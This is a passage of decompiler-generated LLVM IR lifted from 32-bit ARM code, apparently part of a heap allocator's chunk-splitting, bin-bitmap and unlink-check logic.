  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v2_1362c = add i32 %v1_1362c, ptrtoint (i32* @global_var_233cc.493 to i32)
  %v3_1362c = inttoptr i32 %v2_1362c to i32*
  %v4_1362c = load i32, i32* %v3_1362c, align 4
  %v3_13630 = sdiv i32 %v0_1363c, 32
  store i32 %v3_13630, i32* %r3.global-to-local, align 4
  %v4_13634 = mul nsw i32 %v3_13630, 4
  %v5_13634 = add i32 %v4_1362c, %v4_13634
  store i32 %v5_13634, i32* %r1.global-to-local, align 4
  %v1_13638 = add i32 %v5_13634, 820
  %v2_13638 = inttoptr i32 %v1_13638 to i32*
  %v3_13638 = load i32, i32* %v2_13638, align 4
  %v1_1363c = urem i32 %v0_1363c, 32
  store i32 %v1_1363c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_13644 = shl i32 1, %v1_1363c
  %v8_13644 = or i32 %v3_13638, %v7_13644
  store i32 %v8_13644, i32* %r3.global-to-local, align 4
  %v1_13648 = load i32, i32* @r6, align 4
  %v2_13648 = add i32 %v1_13648, 12
  %v3_13648 = inttoptr i32 %v2_13648 to i32*
  store i32 %v0_13648, i32* %v3_13648, align 4
  %v0_1364c = load i32, i32* @lr, align 4
  %v1_1364c = load i32, i32* @r6, align 4
  %v2_1364c = add i32 %v1_1364c, 8
  %v3_1364c = inttoptr i32 %v2_1364c to i32*
  store i32 %v0_1364c, i32* %v3_1364c, align 4
  %v0_13650 = load i32, i32* %r3.global-to-local, align 4
  %v1_13650 = load i32, i32* %r1.global-to-local, align 4
  %v2_13650 = add i32 %v1_13650, 820
  %v3_13650 = inttoptr i32 %v2_13650 to i32*
  store i32 %v0_13650, i32* %v3_13650, align 4
  %v0_13654 = load i32, i32* @r6, align 4
  %v1_13654 = load i32, i32* @lr, align 4
  %v2_13654 = add i32 %v1_13654, 12
  %v3_13654 = inttoptr i32 %v2_13654 to i32*
  store i32 %v0_13654, i32* %v3_13654, align 4
  %v0_13658 = load i32, i32* @r6, align 4
  %v1_13658 = load i32, i32* %ip.global-to-local, align 4
  %v2_13658 = add i32 %v1_13658, 8
  %v3_13658 = inttoptr i32 %v2_13658 to i32*
  store i32 %v0_13658, i32* %v3_13658, align 4
  %v0_13674.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13674

dec_label_pc_13660:                               ; preds = %dec_label_pc_13500, %dec_label_pc_134b8, %dec_label_pc_13514
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r1.global-to-local, align 4
  %v4_13668 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13668, i32* @sb, align 4
  %v0_1366c = load i32, i32* @sl, align 4
  %v1_1366c = add i32 %v0_1366c, 16
  store i32 %v1_1366c, i32* @fp, align 4
  %v1_13670 = add i32 %v4_13668, 52
  store i32 %v1_13670, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13674

dec_label_pc_13674:                               ; preds = %dec_label_pc_13628, %dec_label_pc_13660
  %v0_13594 = phi i32 [ %v0_13674.pre, %dec_label_pc_13628 ], [ %v1_13670, %dec_label_pc_13660 ]
  %v1_13674 = add i32 %v0_13594, 12
  %v2_13674 = inttoptr i32 %v1_13674 to i32*
  %v3_13674 = load i32, i32* %v2_13674, align 4
  store i32 %v3_13674, i32* @r6, align 4
  %v9_13678 = icmp eq i32 %v3_13674, %v0_13594
  br i1 %v9_13678, label %dec_label_pc_13680, label %dec_label_pc_13528

dec_label_pc_13680:                               ; preds = %dec_label_pc_13674
  %v0_13680 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_13680, 256
  %v0_13738.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_13680.dec_label_pc_13738_crit_edge, label %dec_label_pc_13688

dec_label_pc_13680.dec_label_pc_13738_crit_edge:  ; preds = %dec_label_pc_13680
  %.pre203 = mul i32 %v0_13738.pre, 8
  br label %dec_label_pc_13738

dec_label_pc_13688:                               ; preds = %dec_label_pc_13680
  %v4_13688 = mul i32 %v0_13738.pre, 8
  %v5_13688 = add i32 %v4_13688, %v0_13594
  store i32 %v5_13688, i32* %r3.global-to-local, align 4
  %v1_1368c = add i32 %v5_13688, -8
  store i32 %v1_1368c, i32* %r1.global-to-local, align 4
  %v1_13690 = add i32 %v5_13688, 4
  %v2_13690 = inttoptr i32 %v1_13690 to i32*
  %storemerge.pre = load i32, i32* %v2_13690, align 4
  br label %dec_label_pc_13730

dec_label_pc_13698:                               ; preds = %dec_label_pc_13730
  %v1_13698 = add i32 %v1_136c0, 4
  %v2_13698 = inttoptr i32 %v1_13698 to i32*
  %v3_13698 = load i32, i32* %v2_13698, align 4
  store i32 %v3_13698, i32* %r3.global-to-local, align 4
  %v1_1369c = and i32 %v3_13698, -4
  store i32 %v1_1369c, i32* %r2.global-to-local, align 4
  %v3_136a0 = icmp ult i32 %v1_1369c, %v0_13680
  %v1_136a4 = add i32 %v1_136c0, 12
  %v2_136a4 = inttoptr i32 %v1_136a4 to i32*
  %v3_136a4 = load i32, i32* %v2_136a4, align 4
  store i32 %v3_136a4, i32* %r0.global-to-local, align 4
  br i1 %v3_136a0, label %dec_label_pc_13730, label %dec_label_pc_136ac

dec_label_pc_136ac:                               ; preds = %dec_label_pc_13698
  %v1_136ac = add i32 %v1_136c0, 8
  %v2_136ac = inttoptr i32 %v1_136ac to i32*
  %v3_136ac = load i32, i32* %v2_136ac, align 4
  store i32 %v3_136ac, i32* %r1.global-to-local, align 4
  %v1_136b0 = add i32 %v3_136ac, 12
  %v2_136b0 = inttoptr i32 %v1_136b0 to i32*
  %v3_136b0 = load i32, i32* %v2_136b0, align 4
  store i32 %v3_136b0, i32* %r3.global-to-local, align 4
  %v9_136b4 = icmp eq i32 %v3_136b0, %v1_136c0
  br i1 %v9_136b4, label %dec_label_pc_136bc, label %dec_label_pc_136c8

dec_label_pc_136bc:                               ; preds = %dec_label_pc_136ac
  %v1_136bc = add i32 %v3_136a4, 8
  %v2_136bc = inttoptr i32 %v1_136bc to i32*
  %v3_136bc = load i32, i32* %v2_136bc, align 4
  store i32 %v3_136bc, i32* %r3.global-to-local, align 4
  %v9_136c0 = icmp eq i32 %v3_136bc, %v1_136c0
  br i1 %v9_136c0, label %dec_label_pc_136cc, label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %dec_label_pc_136ac, %dec_label_pc_136bc
  %v0_136c8 = call i32 @abort()
  store i32 %v0_136c8, i32* %r0.global-to-local, align 4
  %v0_136cc.pre = load i32, i32* @sl, align 4
  %v1_136cc.pre = load i32, i32* @r2, align 4
  %v0_136d4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_136cc

dec_label_pc_136cc:                               ; preds = %dec_label_pc_136bc, %dec_label_pc_136c8
  %v1_136d4 = phi i32 [ %v3_136a4, %dec_label_pc_136bc ], [ %v0_136c8, %dec_label_pc_136c8 ]
  %v0_136d4 = phi i32 [ %v3_136ac, %dec_label_pc_136bc ], [ %v0_136d4.pre, %dec_label_pc_136c8 ]
  %v1_136cc = phi i32 [ %v1_1369c, %dec_label_pc_136bc ], [ %v1_136cc.pre, %dec_label_pc_136c8 ]
  %v0_136cc = phi i32 [ %v0_13680, %dec_label_pc_136bc ], [ %v0_136cc.pre, %dec_label_pc_136c8 ]
  %v2_136cc = sub i32 %v1_136cc, %v0_136cc
  store i32 %v2_136cc, i32* %lr.global-to-local, align 4
  %v2_136d4 = add i32 %v1_136d4, 8
  %v3_136d4 = inttoptr i32 %v2_136d4 to i32*
  store i32 %v0_136d4, i32* %v3_136d4, align 4
  %v0_136d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_136d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_136d8 = add i32 %v1_136d8, 12
  %v3_136d8 = inttoptr i32 %v2_136d8 to i32*
  store i32 %v0_136d8, i32* %v3_136d8, align 4
  %v0_136dc = load i32, i32* %ip.global-to-local, align 4
  %v1_136dc = add i32 %v0_136dc, 8
  store i32 %v1_136dc, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_136cc, 15
  br i1 %tmp210, label %dec_label_pc_136fc, label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %dec_label_pc_136cc
  %v1_136e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_136e4 = add i32 %v1_136e4, %v0_136dc
  store i32 %v2_136e4, i32* %r2.global-to-local, align 4
  %v1_136e8 = add i32 %v2_136e4, 4
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* %r3.global-to-local, align 4
  store i32 %v1_136dc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136f0

dec_label_pc_136f0.loopexit:                      ; preds = %dec_label_pc_13590
  %v1_1359c = load i32, i32* @r6, align 4
  %v2_1359c = load i32, i32* @sl, align 4
  %v3_1359c = add i32 %v2_1359c, %v1_1359c
  store i32 %v3_1359c, i32* %r2.global-to-local, align 4
  %v2_135a0 = add i32 %v3_1359c, 4
  %v3_135a0 = inttoptr i32 %v2_135a0 to i32*
  %v4_135a0 = load i32, i32* %v3_135a0, align 4
  store i32 %v4_135a0, i32* %r3.global-to-local, align 4
  %v2_135a4 = add i32 %v1_1359c, 8
  store i32 %v2_135a4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %.dec_label_pc_136f0_crit_edge, %dec_label_pc_136f0.loopexit, %dec_label_pc_136e4
  %v1_136f4 = phi i32 [ %v4_13818, %.dec_label_pc_136f0_crit_edge ], [ %v3_1359c, %dec_label_pc_136f0.loopexit ], [ %v2_136e4, %dec_label_pc_136e4 ]
  %v0_136f0 = phi i32 [ %v7_13818, %.dec_label_pc_136f0_crit_edge ], [ %v4_135a0, %dec_label_pc_136f0.loopexit ], [ %v3_136e8, %dec_label_pc_136e4 ]
  %v1_136f0 = or i32 %v0_136f0, 1
  store i32 %v1_136f0, i32* %r3.global-to-local, align 4
  %v2_136f4 = add i32 %v1_136f4, 4
  %v3_136f4 = inttoptr i32 %v2_136f4 to i32*
  store i32 %v1_136f0, i32* %v3_136f4, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136cc
  %v1_136fc = load i32, i32* @sl, align 4
  %v2_136fc = add i32 %v1_136fc, %v0_136dc
  store i32 %v2_136fc, i32* %r2.global-to-local, align 4
  %v1_13700 = or i32 %v1_136fc, 1
  store i32 %v1_13700, i32* %r3.global-to-local, align 4
  %v0_13704 = load i32, i32* %lr.global-to-local, align 4
  %v1_13704 = or i32 %v0_13704, 1
  store i32 %v1_13704, i32* %r1.global-to-local, align 4
  store i32 %v1_136dc, i32* %r4.global-to-local, align 4
  %v2_1370c = add i32 %v0_136dc, 4
  %v3_1370c = inttoptr i32 %v2_1370c to i32*
  store i32 %v1_13700, i32* %v3_1370c, align 4
  %v0_13710 = load i32, i32* %r2.global-to-local, align 4
  %v1_13710 = load i32, i32* @r6, align 4
  %v2_13710 = add i32 %v1_13710, 8
  %v3_13710 = inttoptr i32 %v2_13710 to i32*
  store i32 %v0_13710, i32* %v3_13710, align 4
  %v0_13714 = load i32, i32* %r2.global-to-local, align 4
  %v1_13714 = load i32, i32* @r6, align 4
  %v2_13714 = add i32 %v1_13714, 12
  %v3_13714 = inttoptr i32 %v2_13714 to i32*
  store i32 %v0_13714, i32* %v3_13714, align 4
  %v0_13718 = load i32, i32* %lr.global-to-local, align 4
  %v1_13718 = load i32, i32* %r2.global-to-local, align 4
  %v3_13718 = add i32 %v1_13718, %v0_13718
  %v4_13718 = inttoptr i32 %v3_13718 to i32*
  store i32 %v0_13718, i32* %v4_13718, align 4
  %v0_1371c = load i32, i32* %r1.global-to-local, align 4
  %v1_1371c = load i32, i32* %r2.global-to-local, align 4
  %v2_1371c = add i32 %v1_1371c, 4
  %v3_1371c = inttoptr i32 %v2_1371c to i32*
  store i32 %v0_1371c, i32* %v3_1371c, align 4
  %v0_13720 = load i32, i32* @r6, align 4
  %v1_13720 = load i32, i32* %r2.global-to-local, align 4
  %v2_13720 = add i32 %v1_13720, 12
  %v3_13720 = inttoptr i32 %v2_13720 to i32*
  store i32 %v0_13720, i32* %v3_13720, align 4
  %v0_13724 = load i32, i32* @r6, align 4
  %v1_13724 = load i32, i32* %r2.global-to-local, align 4
  %v2_13724 = add i32 %v1_13724, 8
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  store i32 %v0_13724, i32* %v3_13724, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_13730:                               ; preds = %dec_label_pc_13698, %dec_label_pc_13688
  %v1_136c0 = phi i32 [ %storemerge.pre, %dec_label_pc_13688 ], [ %v3_136a4, %dec_label_pc_13698 ]
  store i32 %v1_136c0, i32* %ip.global-to-local, align 4
  %v9_13730 = icmp eq i32 %v1_136c0, %v1_1368c
  br i1 %v9_13730, label %dec_label_pc_13738.loopexit, label %dec_label_pc_13698

dec_label_pc_13738.loopexit:                      ; preds = %dec_label_pc_13730
  br label %dec_label_pc_13738

dec_label_pc_13738:                               ; preds = %dec_label_pc_13680.dec_label_pc_13738_crit_edge, %dec_label_pc_13738.loopexit
  %v4_13768.pre-phi = phi i32 [ %.pre203, %dec_label_pc_13680.dec_label_pc_13738_crit_edge ], [ %v4_13688, %dec_label_pc_13738.loopexit ]
  %v1_13738 = add i32 %v0_13738.pre, 1
  store i32 %v1_13738, i32* %r2.global-to-local, align 4
  %v1_1373c = urem i32 %v1_13738, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r0.global-to-local, align 4
  %v6_13748 = shl i32 1, %v1_1373c
  store i32 %v6_13748, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13750 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13750, i32* %r3.global-to-local, align 4
  %v3_13754 = udiv i32 %v1_13738, 32
  store i32 %v3_13754, i32* @r5, align 4
  %v4_13758 = mul nuw nsw i32 %v3_13754, 4
  %v5_13758 = add i32 %v4_13750, %v4_13758
  store i32 %v5_13758, i32* %r2.global-to-local, align 4
  %v1_1375c = add i32 %v5_13758, 820
  %v2_1375c = inttoptr i32 %v1_1375c to i32*
  %v3_1375c = load i32, i32* %v2_1375c, align 4
  store i32 %v3_1375c, i32* @r4, align 4
  %v1_13760 = add i32 %v4_13750, 52
  store i32 %v1_13760, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_13768 = add i32 %v1_13760, %v4_13768.pre-phi
  store i32 %v5_13768, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1376c

dec_label_pc_1376c:                               ; preds = %dec_label_pc_137d4, %dec_label_pc_13738
  %v1_13774 = phi i32 [ %v1_13774.pre, %dec_label_pc_137d4 ], [ %v3_1375c, %dec_label_pc_13738 ]
  %v0_13774 = phi i32 [ %v0_1376c.pre, %dec_label_pc_137d4 ], [ %v6_13748, %dec_label_pc_13738 ]
  %v1_1376c = sub i32 1, %v0_13774
  %v2_1376c = icmp ult i32 %v0_13774, 2
  %v1_1376c. = select i1 %v2_1376c, i32 %v1_1376c, i32 0
  store i32 %v1_1376c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_13774, %v1_13774
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1376c
  %v5_13778 = or i32 %v1_1376c., 1
  store i32 %v5_13778, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13784.preheader

bb145:                                            ; preds = %dec_label_pc_1376c
  %v2_1377c = icmp eq i32 %v1_1376c., 0
  br i1 %v2_1377c, label %.dec_label_pc_137c0.preheader_crit_edge, label %dec_label_pc_13784.preheader

.dec_label_pc_137c0.preheader_crit_edge:          ; preds = %bb145
  %v0_137b857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137c0.preheader

dec_label_pc_13784.preheader:                     ; preds = %bb145, %.thread15
  %v0_13784.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13784

dec_label_pc_13784:                               ; preds = %dec_label_pc_13784.preheader, %dec_label_pc_13790
  %v0_13784 = phi i32 [ %v0_13784.pre, %dec_label_pc_13784.preheader ], [ %v1_13784, %dec_label_pc_13790 ]
  %v1_13784 = add i32 %v0_13784, 1
  store i32 %v1_13784, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_13784, 2
  br i1 %tmp211, label %dec_label_pc_13864.loopexit, label %dec_label_pc_13790

dec_label_pc_13790:                               ; preds = %dec_label_pc_13784
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r3.global-to-local, align 4
  %v1_13794 = load i32, i32* @r8, align 4
  %v2_13794 = add i32 %v1_13794, ptrtoint (i32* @global_var_233cc.493 to i32)
  %v3_13794 = inttoptr i32 %v2_13794 to i32*
  %v4_13794 = load i32, i32* %v3_13794, align 4
  store i32 %v4_13794, i32* %r2.global-to-local, align 4
  %v4_13798 = mul i32 %v1_13784, 4
  %v5_13798 = add i32 %v4_13794, %v4_13798
  store i32 %v5_13798, i32* %r3.global-to-local, align 4
  %v1_1379c = add i32 %v5_13798, 820
  %v2_1379c = inttoptr i32 %v1_1379c to i32*
  %v3_1379c = load i32, i32* %v2_1379c, align 4
  store i32 %v3_1379c, i32* @r4, align 4
  %v2_137a0 = icmp eq i32 %v3_1379c, 0
  br i1 %v2_137a0, label %dec_label_pc_13784, label %dec_label_pc_137a8

dec_label_pc_137a8:                               ; preds = %dec_label_pc_13790
  %v4_137a8 = mul i32 %v1_13784, 256
  %v5_137a8 = add i32 %v4_13794, %v4_137a8
  store i32 %v5_137a8, i32* %r3.global-to-local, align 4
  %v1_137ac = add i32 %v5_137a8, 44
  store i32 %v1_137ac, i32* %r0.global-to-local, align 4
  %v0_137b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_137b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_137c0.preheader

dec_label_pc_137c0.preheader:                     ; preds = %.dec_label_pc_137c0.preheader_crit_edge, %dec_label_pc_137a8
  %v0_137b857 = phi i32 [ %v1_137ac, %dec_label_pc_137a8 ], [ %v0_137b857.pre, %.dec_label_pc_137c0.preheader_crit_edge ]
  %v0_137dc = phi i32 [ %v3_1379c, %dec_label_pc_137a8 ], [ %v1_13774, %.dec_label_pc_137c0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_137b0, %dec_label_pc_137a8 ], [ %v0_13774, %.dec_label_pc_137c0.preheader_crit_edge ]
  %v2_137c054 = and i32 %ip.promoted, %v0_137dc
  %v4_137c056 = icmp eq i32 %v2_137c054, 0
  br i1 %v4_137c056, label %dec_label_pc_137b8, label %dec_label_pc_137c8

dec_label_pc_137b8:                               ; preds = %dec_label_pc_137c0.preheader, %dec_label_pc_137b8
  %v2_137bc59 = phi i32 [ %v2_137bc, %dec_label_pc_137b8 ], [ %ip.promoted, %dec_label_pc_137c0.preheader ]
  %v0_137b858 = phi i32 [ %v1_137b8, %dec_label_pc_137b8 ], [ %v0_137b857, %dec_label_pc_137c0.preheader ]
  %v1_137b8 = add i32 %v0_137b858, 8
  %v2_137bc = mul i32 %v2_137bc59, 2
  %v2_137c0 = and i32 %v2_137bc, %v0_137dc
  %v4_137c0 = icmp eq i32 %v2_137c0, 0
  br i1 %v4_137c0, label %dec_label_pc_137b8, label %dec_label_pc_137c0.dec_label_pc_137c8_crit_edge

dec_label_pc_137c0.dec_label_pc_137c8_crit_edge:  ; preds = %dec_label_pc_137b8
  store i32 %v1_137b8, i32* %r0.global-to-local, align 4
  store i32 %v2_137bc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_137c0.dec_label_pc_137c8_crit_edge, %dec_label_pc_137c0.preheader
  %v0_137e8 = phi i32 [ %v2_137bc, %dec_label_pc_137c0.dec_label_pc_137c8_crit_edge ], [ %ip.promoted, %dec_label_pc_137c0.preheader ]
  %v0_1380c = phi i32 [ %v1_137b8, %dec_label_pc_137c0.dec_label_pc_137c8_crit_edge ], [ %v0_137b857, %dec_label_pc_137c0.preheader ]
  %v1_137c8 = add i32 %v0_1380c, 12
  %v2_137c8 = inttoptr i32 %v1_137c8 to i32*
  %v3_137c8 = load i32, i32* %v2_137c8, align 4
  store i32 %v3_137c8, i32* @lr, align 4
  %v9_137cc = icmp eq i32 %v3_137c8, %v0_1380c
  br i1 %v9_137cc, label %dec_label_pc_137d4, label %dec_label_pc_137f4

dec_label_pc_137d4:                               ; preds = %dec_label_pc_137c8
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r0.global-to-local, align 4
  %v1_137d8 = load i32, i32* @r8, align 4
  %v2_137d8 = add i32 %v1_137d8, ptrtoint (i32* @global_var_233cc.493 to i32)
  %v3_137d8 = inttoptr i32 %v2_137d8 to i32*
  %v4_137d8 = load i32, i32* %v3_137d8, align 4
  %v2_137dc = sub i32 -1, %v0_137e8
  %v3_137dc = and i32 %v0_137dc, %v2_137dc
  store i32 %v3_137dc, i32* @r4, align 4
  %v1_137e0 = load i32, i32* @r5, align 4
  %v4_137e0 = mul i32 %v1_137e0, 4
  %v5_137e0 = add i32 %v4_137e0, %v4_137d8
  store i32 %v5_137e0, i32* %r3.global-to-local, align 4
  %v1_137e4 = add i32 %v0_1380c, 8
  store i32 %v1_137e4, i32* %r0.global-to-local, align 4
  %v2_137e8 = mul i32 %v0_137e8, 2
  store i32 %v2_137e8, i32* %ip.global-to-local, align 4
  %v2_137ec = add i32 %v5_137e0, 820
  %v3_137ec = inttoptr i32 %v2_137ec to i32*
  store i32 %v3_137dc, i32* %v3_137ec, align 4
  %v0_1376c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_13774.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1376c

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137c8
  %v1_137f4 = add i32 %v3_137c8, 4
  %v2_137f4 = inttoptr i32 %v1_137f4 to i32*
  %v3_137f4 = load i32, i32* %v2_137f4, align 4
  store i32 %v3_137f4, i32* %r3.global-to-local, align 4
  %v1_137f8 = and i32 %v3_137f4, -4
  store i32 %v1_137f8, i32* %r2.global-to-local, align 4
  %v0_137fc = load i32, i32* @sl, align 4
  %v2_137fc = sub i32 %v1_137f8, %v0_137fc
  store i32 %v2_137fc, i32* %ip.global-to-local, align 4
  %v1_13800 = add i32 %v3_137c8, 12
  %v2_13800 = inttoptr i32 %v1_13800 to i32*
  %v3_13800 = load i32, i32* %v2_13800, align 4
  store i32 %v3_13800, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_137fc, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_137f4
  %v6_13808 = add i32 %v1_137f8, %v3_137c8
  store i32 %v6_13808, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_137f4, %bb146
  %v2_1380c = add i32 %v3_13800, 8
  %v3_1380c = inttoptr i32 %v2_1380c to i32*
  store i32 %v0_1380c, i32* %v3_1380c, align 4
  %v0_13810 = load i32, i32* %r3.global-to-local, align 4
  %v1_13810 = load i32, i32* %r0.global-to-local, align 4
  %v2_13810 = add i32 %v1_13810, 12
  %v3_13810 = inttoptr i32 %v2_13810 to i32*
  store i32 %v0_13810, i32* %v3_13810, align 4
  %v4_13814 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_136f0_crit_edge, label %dec_label_pc_13820

.dec_label_pc_136f0_crit_edge:                    ; preds = %bb147
  %v5_13814 = add i32 %v4_13814, 8
  store i32 %v5_13814, i32* %r4.global-to-local, align 4
  %v4_13818 = load i32, i32* %r2.global-to-local, align 4
  %v5_13818 = add i32 %v4_13818, 4
  %v6_13818 = inttoptr i32 %v5_13818 to i32*
  %v7_13818 = load i32, i32* %v6_13818, align 4
  store i32 %v7_13818, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_136f0

dec_label_pc_13820:                               ; preds = %bb147
  %v1_13820 = load i32, i32* @sl, align 4
  %v2_13820 = add i32 %v1_13820, %v4_13814
  store i32 %v2_13820, i32* %r1.global-to-local, align 4
  %v1_13828 = load i32, i32* @r6, align 4
  %v2_13828 = add i32 %v1_13828, 8
  %v3_13828 = inttoptr i32 %v2_13828 to i32*
  store i32 %v2_13820, i32* %v3_13828, align 4
  %v0_1382c = load i32, i32* %r1.global-to-local, align 4
  %v1_1382c = load i32, i32* @r6, align 4
  %v2_1382c = add i32 %v1_1382c, 12
  %v3_1382c = inttoptr i32 %v2_1382c to i32*
  store i32 %v0_1382c, i32* %v3_1382c, align 4
  %v0_13830 = load i32, i32* @r6, align 4
  %v1_13830 = load i32, i32* %r1.global-to-local, align 4
  %v2_13830 = add i32 %v1_13830, 8
  %v3_13830 = inttoptr i32 %v2_13830 to i32*
  store i32 %v0_13830, i32* %v3_13830, align 4
  %v0_13834 = load i32, i32* @r6, align 4
  %v1_13834 = load i32, i32* %r1.global-to-local, align 4
  %v2_13834 = add i32 %v1_13834, 12
  %v3_13834 = inttoptr i32 %v2_13834 to i32*
  store i32 %v0_13834, i32* %v3_13834, align 4
  %tmp213 = icmp ult i32 %v1_13820, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_13820
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v8_13840 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v8_13840, i32* %r3.global-to-local, align 4
  %v4_13844 = load i32, i32* %r1.global-to-local, align 4
  %v6_13844 = add i32 %v8_13840, 48
  %v7_13844 = inttoptr i32 %v6_13844 to i32*
  store i32 %v4_13844, i32* %v7_13844, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_13820, %bb148
  %v0_13848 = load i32, i32* @sl, align 4
  %v1_13848 = or i32 %v0_13848, 1
  store i32 %v1_13848, i32* %r2.global-to-local, align 4
  %v0_1384c = load i32, i32* %ip.global-to-local, align 4
  %v1_1384c = or i32 %v0_1384c, 1
  store i32 %v1_1384c, i32* %r3.global-to-local, align 4
  %v0_13850 = load i32, i32* @lr, align 4
  %v1_13850 = add i32 %v0_13850, 8
  store i32 %v1_13850, i32* %r4.global-to-local, align 4
  %v2_13854 = add i32 %v0_13850, 4
  %v3_13854 = inttoptr i32 %v2_13854 to i32*
  store i32 %v1_13848, i32* %v3_13854, align 4
  %v0_13858 = load i32, i32* %ip.global-to-local, align 4
  %v1_13858 = load i32, i32* %r1.global-to-local, align 4
  %v3_13858 = add i32 %v1_13858, %v0_13858
  %v4_13858 = inttoptr i32 %v3_13858 to i32*
  store i32 %v0_13858, i32* %v4_13858, align 4
  %v0_1385c = load i32, i32* %r3.global-to-local, align 4
  %v1_1385c = load i32, i32* %r1.global-to-local, align 4
  %v2_1385c = add i32 %v1_1385c, 4
  %v3_1385c = inttoptr i32 %v2_1385c to i32*
  store i32 %v0_1385c, i32* %v3_1385c, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_13864.loopexit:                      ; preds = %dec_label_pc_13784
  br label %dec_label_pc_13864

dec_label_pc_13864:                               ; preds = %dec_label_pc_13864.loopexit, %dec_label_pc_13478, %dec_label_pc_13480
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %ip.global-to-local, align 4
  %v4_1386c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_1386c, i32* @r0, align 4
  %v1_13870 = add i32 %v4_1386c, 44
  %v2_13870 = inttoptr i32 %v1_13870 to i32*
  %v3_13870 = load i32, i32* %v2_13870, align 4
  store i32 %v3_13870, i32* %ip.global-to-local, align 4
  %v1_13874 = add i32 %v3_13870, 4
  %v2_13874 = inttoptr i32 %v1_13874 to i32*
  %v3_13874 = load i32, i32* %v2_13874, align 4
  %v0_13878 = load i32, i32* @sl, align 4
  %v1_13878 = add i32 %v0_13878, 16
  store i32 %v1_13878, i32* %r1.global-to-local, align 4
  %v1_1387c = and i32 %v3_13874, -4
  store i32 %v1_1387c, i32* %r3.global-to-local, align 4
  %v3_13880 = icmp ult i32 %v1_1387c, %v1_13878
  br i1 %v3_13880, label %dec_label_pc_138b0, label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %dec_label_pc_13864
  %v2_1388c = sub i32 %v1_1387c, %v0_13878
  %v2_13890 = add i32 %v0_13878, %v3_13870
  store i32 %v2_13890, i32* %r1.global-to-local, align 4
  %v1_13894 = or i32 %v2_1388c, 1
  store i32 %v1_13894, i32* %r3.global-to-local, align 4
  %v1_13898 = or i32 %v0_13878, 1
  store i32 %v1_13898, i32* %r2.global-to-local, align 4
  %v1_1389c = add i32 %v3_13870, 8
  store i32 %v1_1389c, i32* %r4.global-to-local, align 4
  store i32 %v1_13898, i32* %v2_13874, align 4
  %v0_138a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_138a4 = load i32, i32* @r0, align 4
  %v2_138a4 = add i32 %v1_138a4, 44
  %v3_138a4 = inttoptr i32 %v2_138a4 to i32*
